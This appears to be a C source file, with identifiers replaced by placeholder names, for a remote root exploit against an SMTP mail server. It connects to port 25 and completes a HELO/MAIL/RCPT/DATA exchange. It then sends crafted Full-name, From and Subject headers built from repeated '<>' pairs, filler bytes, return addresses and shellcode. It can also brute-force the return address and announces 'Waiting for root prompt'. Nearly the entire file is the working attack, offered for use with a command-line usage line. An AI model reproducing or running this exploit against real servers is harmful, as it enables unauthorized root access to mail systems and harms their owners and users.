
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_2__ ;
typedef struct TYPE_3__ TYPE_1__ ;


struct TYPE_3__ {unsigned long s_addr; } ;
struct sockaddr_in {char sin_zero; TYPE_1__ sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {int h_length; int h_addr; } ;
typedef int server ;
typedef int buf ;
struct TYPE_4__ {unsigned long angle; unsigned long nops; scalar_t__ aptr; } ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 TYPE_2__* VAR_4 ;
 int FUNC_0 (char*) ;
 int FUNC_1 (int) ;
 int * VAR_5 ;
 scalar_t__ FUNC_2 (int,struct sockaddr*,int) ;
 int FUNC_3 (int ) ;
 int FUNC_4 (int ) ;
 int FUNC_5 (char*,int ) ;
 int FUNC_6 () ;
 struct hostent* FUNC_7 (char*) ;
 int FUNC_8 () ;
 int FUNC_9 () ;
 int FUNC_10 (int) ;
 unsigned long FUNC_11 (char*) ;
 int VAR_6 ;
 int FUNC_12 (char*,int ,int ) ;
 int FUNC_13 (char*,int ,int) ;
 int FUNC_14 (char*,...) ;
 int FUNC_15 () ;
 int FUNC_16 (int,int) ;
 scalar_t__ FUNC_17 (int,int) ;
 int FUNC_18 (int ,int ,int ) ;
 int FUNC_19 (char*,char*,char*) ;
 int FUNC_20 (char*,char*,unsigned long*) ;
 int VAR_7 ;
 unsigned long FUNC_21 (int *) ;
 int FUNC_22 (int,char*) ;

int FUNC_23(int VAR_8, char **VAR_9) {
 struct sockaddr_in VAR_10;
 unsigned long VAR_11,VAR_12,VAR_13=0;
 int VAR_14,VAR_15;
 char VAR_16[VAR_1],VAR_17[VAR_1],*VAR_18;
 if (VAR_8 <= 3) {
  FUNC_14("%s <target ip> <myip> <target number> [bruteforce start addr]\n",VAR_9[0]);
  FUNC_15();
  return 0;
 }
 VAR_15=FUNC_0(VAR_9[3]);
 if (VAR_15 < 0 || VAR_15 >= VAR_6) {
  FUNC_15();
  return 0;
 }
 if (VAR_8 > 4) FUNC_20(VAR_9[4],"%x",&VAR_13);

 FUNC_9();

 FUNC_5(VAR_9[2],VAR_2);
 if (VAR_13 && !FUNC_6()) {
  FUNC_8();
  return 0;
 }

bfstart:
 if (VAR_13) {
  FUNC_14("Trying address 0x%x\n",VAR_13);
  FUNC_4(VAR_7);
 }
 if ((VAR_14 = FUNC_18(VAR_0, VAR_3, 0)) == -1) {
  FUNC_14("Unable to create socket\n");
  FUNC_3(0);
 }
 VAR_10.sin_family = VAR_0;
 VAR_10.sin_port = FUNC_10(25);
 if (!VAR_13) {
  FUNC_14("Resolving address... ");
  FUNC_4(VAR_7);
 }
 if ((VAR_11 = FUNC_11(VAR_9[1])) == -1) {
  struct hostent *VAR_19;
  if ((VAR_19=FUNC_7(VAR_9[1])) == ((void*)0)) {
   FUNC_14("Unable to resolve address\n");
   FUNC_3(0);
  }
  FUNC_12((char*)&VAR_10.sin_addr, VAR_19->h_addr, VAR_19->h_length);
 }
 else VAR_10.sin_addr.s_addr = VAR_11;
 FUNC_13(&(VAR_10.sin_zero), 0, 8);
 if (!VAR_13) {
  FUNC_14("Address found\n");
  FUNC_14("Connecting... ");
  FUNC_4(VAR_7);
 }
 if (FUNC_2(VAR_14,(struct sockaddr *)&VAR_10, sizeof(VAR_10)) != 0) {
  FUNC_14("Unable to connect\n");
  FUNC_3(0);
 }
 if (!VAR_13) {
  FUNC_14("Connected!\n");
  FUNC_14("Sending exploit... ");
  FUNC_4(VAR_7);
 }
 FUNC_16(VAR_14,220);
 FUNC_22(VAR_14,"HELO yahoo.com\r\n");
 FUNC_16(VAR_14,250);
 FUNC_22(VAR_14,"MAIL FROM: spiderman@yahoo.com\r\n");
 FUNC_16(VAR_14,250);
 FUNC_22(VAR_14,"RCPT TO: MAILER-DAEMON\r\n");
 FUNC_16(VAR_14,250);
 FUNC_22(VAR_14,"DATA\r\n");
 FUNC_16(VAR_14,354);
 FUNC_13(VAR_17,0,sizeof(VAR_17));
 VAR_18=VAR_17;
 for (VAR_12=0;VAR_12<VAR_4[VAR_15].angle;VAR_12++) {
  *VAR_18++='<';
  *VAR_18++='>';
 }
 *VAR_18++='(';
 for (VAR_12=0;VAR_12<VAR_4[VAR_15].nops;VAR_12++) *VAR_18++=0xf8;
 *VAR_18++=')';
 *VAR_18++=((char*)&VAR_4[VAR_15].aptr)[0];
 *VAR_18++=((char*)&VAR_4[VAR_15].aptr)[1];
 *VAR_18++=((char*)&VAR_4[VAR_15].aptr)[2];
 *VAR_18++=((char*)&VAR_4[VAR_15].aptr)[3];
 *VAR_18++=0;
 FUNC_19(VAR_16,"Full-name: %s\r\n",VAR_17);
 FUNC_22(VAR_14,VAR_16);
 FUNC_19(VAR_16,"From: %s\r\n",VAR_17);
 FUNC_22(VAR_14,VAR_16);

 VAR_18=VAR_17;
 VAR_4[VAR_15].aptr+=4;
 *VAR_18++=((char*)&VAR_4[VAR_15].aptr)[0];
 *VAR_18++=((char*)&VAR_4[VAR_15].aptr)[1];
 *VAR_18++=((char*)&VAR_4[VAR_15].aptr)[2];
 *VAR_18++=((char*)&VAR_4[VAR_15].aptr)[3];

 for (VAR_12=0;VAR_12<0x14;VAR_12++) *VAR_18++=0xf8;
 VAR_4[VAR_15].aptr+=0x18;
 *VAR_18++=((char*)&VAR_4[VAR_15].aptr)[0];
 *VAR_18++=((char*)&VAR_4[VAR_15].aptr)[1];
 *VAR_18++=((char*)&VAR_4[VAR_15].aptr)[2];
 *VAR_18++=((char*)&VAR_4[VAR_15].aptr)[3];

 for (VAR_12=0;VAR_12<0x4c;VAR_12++) *VAR_18++=0x01;
 VAR_4[VAR_15].aptr+=0x4c+4;
 *VAR_18++=((char*)&VAR_4[VAR_15].aptr)[0];
 *VAR_18++=((char*)&VAR_4[VAR_15].aptr)[1];
 *VAR_18++=((char*)&VAR_4[VAR_15].aptr)[2];
 *VAR_18++=((char*)&VAR_4[VAR_15].aptr)[3];

 for (VAR_12=0;VAR_12<0x8;VAR_12++) *VAR_18++=0xf8;
 VAR_4[VAR_15].aptr+=0x08+4;
 *VAR_18++=((char*)&VAR_4[VAR_15].aptr)[0];
 *VAR_18++=((char*)&VAR_4[VAR_15].aptr)[1];
 *VAR_18++=((char*)&VAR_4[VAR_15].aptr)[2];
 *VAR_18++=((char*)&VAR_4[VAR_15].aptr)[3];

 for (VAR_12=0;VAR_12<0x20;VAR_12++) *VAR_18++=0xf8;
 for (VAR_12=0;VAR_12<FUNC_21(VAR_5);VAR_12++) *VAR_18++=VAR_5[VAR_12];

 *VAR_18++=0;
 FUNC_19(VAR_16,"Subject: AAAAAAAAAAA%s\r\n",VAR_17);
 FUNC_22(VAR_14,VAR_16);
 FUNC_22(VAR_14,".\r\n");
 if (!VAR_13) {
  FUNC_14("Exploit sent!\n");
  FUNC_14("Waiting for root prompt...\n");
  if (FUNC_17(VAR_14,451)) FUNC_14("Failed!\n");
  else FUNC_8();
 }
 else {
  FUNC_17(VAR_14,451);
  FUNC_1(VAR_14);
  VAR_13+=4;
  goto bfstart;
 }
}
